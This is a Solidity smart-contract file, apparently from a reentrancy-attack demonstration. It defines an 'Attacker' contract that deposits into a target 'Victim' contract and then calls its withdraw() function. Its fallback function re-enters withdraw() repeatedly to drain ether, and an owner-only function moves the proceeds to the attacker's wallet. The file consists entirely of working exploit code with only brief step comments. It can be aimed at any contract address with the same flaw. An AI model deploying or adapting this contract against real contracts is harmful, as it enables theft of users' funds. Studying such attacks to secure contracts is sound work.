pragma solidity >=0.8.0;

import "./Owner.sol";
import "./Victim.sol";

contract Attacker is Owner {
    uint256 attackCounter;
    address public victimAddress;

    // set the victim address on deployment
    constructor(address _victimAddress) Owner() {
        victimAddress = address(_victimAddress);
    }

    // get current Attacker balance on Victim contract
    function attackerBalanceOnVictim() external view returns (uint256) {
        return Victim(victimAddress).userBalances(address(this));
    }

    // get current Atatcker balance
    function attackerBalance() external view returns (uint256 _currentBalance) {
        return address(this).balance;
    }

    // final step of the attack to withdraw funds from Attacker contract to EOA
    function withdraw() external payable isOwner() {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    // perform initial funding on Attacker contract
    function fundAttacker() external payable {}

    // perform initial deposit on Victim contract
    function depositToVictim(uint256 _value) external payable {
        (bool success, ) = victimAddress.call{value: _value}(
            abi.encodeWithSignature("deposit()")
        );
        require(success, "deposited to victim contract failed");
    }

    // perform initial call to Victim contract asking to withdraw funds
    function attack(uint256 _attackCounter) external payable {
        attackCounter = _attackCounter;
        victimAddress.call(abi.encodeWithSignature("withdraw()"));
    }

    // perform re-entrancy attack on Victim's withdraw function
    fallback() external payable {
        if (attackCounter > 0) {
            victimAddress.call(abi.encodeWithSignature("withdraw()"));
            attackCounter--;
        }
    }
}
